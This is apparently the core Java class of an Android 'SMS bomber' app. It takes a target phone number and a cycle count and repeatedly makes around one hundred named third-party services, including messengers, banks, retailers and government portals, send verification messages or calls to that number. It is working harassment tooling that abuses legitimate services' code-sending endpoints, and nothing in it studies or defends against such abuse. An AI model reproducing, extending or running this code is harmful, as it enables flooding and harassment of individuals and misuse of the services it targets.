package com.dm.bomber;

import android.util.Log;

import com.dm.bomber.services.*;

import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;

import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class AttackManager {
    private static final String TAG = "AttackManager";

    private final Service[] services;

    private Attack attack;
    private final Callback callback;

    public AttackManager(Callback callback) {
        Service.client = new OkHttpClient.Builder()
                .addInterceptor(chain -> {
                    Request request = chain.request();
                    Log.v(TAG, String.format("Sending request %s", request.url()));

                    Response response = chain.proceed(request);
                    Log.v(TAG, String.format("Received response for %s with status code %s",
                            response.request().url(), response.code()));

                    return response;
                }).build();

        this.callback = callback;
        this.services = new Service[]{
                new Kari(), new Modulebank(), new YandexEda(), new ICQ(),
                new Citilink(), new GloriaJeans(), new Alltime(), new Mcdonalds(),
                new Telegram(), new AtPrime(), new MTS(), new CarSmile(),
                new Sravni(), new OK(), new SushiWok(), new Tele2(),
                new Eldorado(), new Tele2TV(), new MegafonTV(), new YotaTV(),
                new Fivepost(), new Askona(), new FarforCall(), new Sephora(),
                new Ukrzoloto(), new Olltv(), new Wink(), new Lenta(),
                new Pyaterochka(), new ProstoTV(), new Multiplex(), new RendezVous(),
                new Zdravcity(), new Robocredit(), new Yandex(), new MegafonBank(),
                new VoprosRU(), new InDriver(), new Tinder(), new Gosuslugi(),
                new Hoff(), new N1RU(), new Samokat(), new GreenBee(),
                new ToGO(), new Premier(), new Gorparkovka(), new Tinkoff(),
                new MegaDisk(), new KazanExpress(), new BudZdorov(), new FoodBand(),
                new Benzuber(), new Verniy(), new Citimobil(), new HHru(),
                new Ozon(), new Aushan(), new Uber(), new MFC(),
                new Ostin(), new EKA(), new Neftm(), new Plazius(),
                new VKWorki(), new Magnit(), new SberZvuk(), new Smotrim(),
                new Mokka(), new SimpleWine(), new FarforSMS(), new Stolichki(),
                new BApteka(), new HiceBank(), new Evotor(), new Sportmaster(),
                new RiveGauche(), new Yarche(), new Baucenter(), new Dolyame(),
                new GoldApple(), new FriendsClub(), new ChestnyZnak(), new DvaBerega(),
                new MoeZdorovie(), new Sokolov(), new Boxberry(), new Discord(),
                new Privileges(), new NearKitchen(), new Citydrive(), new BelkaCar(),
                new Mozen(), new MosMetro(), new BCS(), new Dostavista(),
                new Metro(), new Niyama(), new RabotaRu(), new Sunlight(),
                new TikTok(), new Zoloto585()
        };
    }

    public void performAttack(String phoneCode, String phone, int cycles) {
        attack = new Attack(phoneCode, phone, cycles);
        attack.start();
    }

    public boolean hasAttack() {
        return attack != null && attack.isAlive();
    }

    public void stopAttack() {
        attack.interrupt();
        Service.client.dispatcher().cancelAll();
    }

    public List<Service> getUsableServices(String phoneCode) {
        List<Service> usableServices = new ArrayList<>();

        for (Service service : services) {
            if (service.requireCode == null || service.requireCode.equals(phoneCode) || phoneCode.isEmpty())
                usableServices.add(service);
        }

        return usableServices;
    }

    public interface Callback {
        void onAttackEnd();

        void onAttackStart(int serviceCount, int numberOfCycles);

        void onProgressChange(int progress);
    }

    private class Attack extends Thread {
        private final String phoneCode;
        private final String phone;
        private final int numberOfCycles;

        private int progress = 0;

        private CountDownLatch tasks;

        public Attack(String phoneCode, String phone, int cycles) {
            super(phone);

            this.phoneCode = phoneCode;
            this.phone = phone;
            this.numberOfCycles = cycles;
        }

        @Override
        public void run() {
            List<Service> usableServices = getUsableServices(phoneCode);

            callback.onAttackStart(usableServices.size(), numberOfCycles);
            Log.i(TAG, String.format("Starting attack on +%s%s", phoneCode, phone));

            for (int cycle = 0; cycle < numberOfCycles; cycle++) {
                Log.i(TAG, String.format("Started cycle %s", cycle));

                tasks = new CountDownLatch(usableServices.size());

                for (Service service : usableServices) {
                    service.prepare(phoneCode, phone);
                    service.run(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NotNull Call call, @NotNull IOException e) {
                            Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);

                            tasks.countDown();
                            callback.onProgressChange(progress++);
                        }

                        @Override
                        public void onResponse(@NotNull Call call, @NotNull Response response) {
                            if (!response.isSuccessful()) {
                                Log.i(TAG, String.format("%s returned an error HTTP code: %s",
                                        service.getClass().getName(), response.code()));
                            }

                            tasks.countDown();
                            callback.onProgressChange(progress++);
                        }
                    });
                }

                try {
                    tasks.await();
                } catch (InterruptedException e) {
                    break;
                }
            }

            callback.onAttackEnd();
            Log.i(TAG, String.format("Attack on +%s%s ended", phoneCode, phone));
        }
    }
}
